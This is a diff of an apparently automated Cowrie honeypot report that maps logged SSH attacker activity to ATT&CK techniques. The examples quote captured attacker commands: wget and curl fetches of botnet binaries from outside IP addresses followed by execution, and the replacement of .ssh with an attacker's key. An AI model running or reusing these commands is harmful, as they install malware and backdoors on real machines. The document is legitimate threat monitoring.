@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-23 04:02:11",
+  "generated": "2026-09-23 05:02:42",
   "totals": {
-    "commands": 637,
-    "login_failed": 356,
-    "login_success": 162,
-    "sessions": 469
+    "commands": 656,
+    "login_failed": 640,
+    "login_success": 170,
+    "sessions": 775
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 356,
+      "count": 640,
       "examples": [
         "pp / pp2025",
         "master / 123",
@@ -21,14 +21,14 @@
         "admin / P@$$w0rd"
       ],
       "first": "2026-09-23T00:00:18.585359Z",
-      "last": "2026-09-23T04:01:07.764905Z",
-      "unique_ips": 27
+      "last": "2026-09-23T05:02:38.857395Z",
+      "unique_ips": 36
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 162,
+      "count": 170,
       "examples": [
         "oliver / oliveroliver",
         "enable\\x00 / linuxshell\\x00",
@@ -37,14 +37,14 @@
         "rk / rk@123"
       ],
       "first": "2026-09-23T00:01:27.467287Z",
-      "last": "2026-09-23T04:00:02.368385Z",
-      "unique_ips": 21
+      "last": "2026-09-23T05:02:26.664555Z",
+      "unique_ips": 27
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 131,
+      "count": 145,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -53,14 +53,14 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-09-23T00:09:15.535070Z",
-      "last": "2026-09-23T03:05:39.792024Z",
-      "unique_ips": 8
+      "last": "2026-09-23T04:37:56.331840Z",
+      "unique_ips": 9
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 126,
+      "count": 127,
       "examples": [
         "ls -lh $(which ls)",
         "ls /home; /bin/busybox BOTNET",
@@ -68,14 +68,14 @@
         "ls -l /var/tmp/.testfile 2>&1"
       ],
       "first": "2026-09-23T00:09:28.586484Z",
-      "last": "2026-09-23T01:27:00.292234Z",
+      "last": "2026-09-23T04:37:13.282409Z",
       "unique_ips": 6
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 91,
+      "count": 93,
       "examples": [
         "cd ~; chattr -ia .ssh; lockr -ia .ssh",
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
@@ -84,14 +84,14 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64"
       ],
       "first": "2026-09-23T00:09:11.761925Z",
-      "last": "2026-09-23T02:40:06.678783Z",
-      "unique_ips": 10
+      "last": "2026-09-23T04:37:14.754674Z",
+      "unique_ips": 11
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 42,
+      "count": 45,
       "examples": [
         "cat /proc/cpuinfo | grep name | wc -l",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
@@ -100,8 +100,8 @@
         "cat /proc/cpuinfo | grep model | grep name | wc -l"
       ],
       "first": "2026-09-23T00:09:22.924859Z",
-      "last": "2026-09-23T03:05:39.688233Z",
-      "unique_ips": 8
+      "last": "2026-09-23T05:02:27.090888Z",
+      "unique_ips": 11
     },
     {
       "id": "T1033",
@@ -144,6 +144,19 @@
       "unique_ips": 4
     },
     {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "Execution",
+      "count": 3,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "nohup $SHELL -c \"curl http://193.203.174.88:9124/linux -o /tmp/Lld4EMD62U; if [ ! -f /tmp/Lld4EMD62U ]; then wget http:/"
+      ],
+      "first": "2026-09-23T00:12:24.367274Z",
+      "last": "2026-09-23T04:32:59.293654Z",
+      "unique_ips": 3
+    },
+    {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
@@ -157,16 +170,16 @@
       "unique_ips": 3
     },
     {
-      "id": "T1059.004",
-      "name": "Command and Scripting Interpreter: Unix Shell",
-      "tactic": "Execution",
-      "count": 2,
+      "id": "T1095",
+      "name": "Non-Application Layer Protocol",
+      "tactic": "Command and Control",
+      "count": 1,
       "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "nohup $SHELL -c \"curl http://193.203.174.88:9124/linux -o /tmp/Lld4EMD62U; if [ ! -f /tmp/Lld4EMD62U ]; then wget http:/"
       ],
-      "first": "2026-09-23T00:12:24.367274Z",
-      "last": "2026-09-23T00:21:16.458525Z",
-      "unique_ips": 2
+      "first": "2026-09-23T04:32:59.293654Z",
+      "last": "2026-09-23T04:32:59.293654Z",
+      "unique_ips": 1
     },
     {
       "id": "T1489",
@@ -184,19 +197,19 @@
   "unmapped": [
     [
       "system",
-      136
+      137
     ],
     [
       "sh",
-      135
+      136
     ],
     [
       "shell",
-      20
+      21
     ],
     [
       "/bin/busybox UNSTABLE",
-      17
+      18
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -212,15 +225,19 @@
     ],
     [
       "echo WRITABLE >/tmp/.testfile 2>&1",
-      4
+      5
     ],
     [
       "rm -f /tmp/.testfile",
-      2
+      3
     ],
     [
       "cd /tmp",
-      2
+      3
+    ],
+    [
+      "echo INFECT_CHECK",
+      3
     ],
     [
       "echo WRITABLE >/var/tmp/.testfile 2>&1",
@@ -232,10 +249,6 @@
     ],
     [
       "cd /var/tmp",
-      2
-    ],
-    [
-      "echo INFECT_CHECK",
       2
     ],
     [
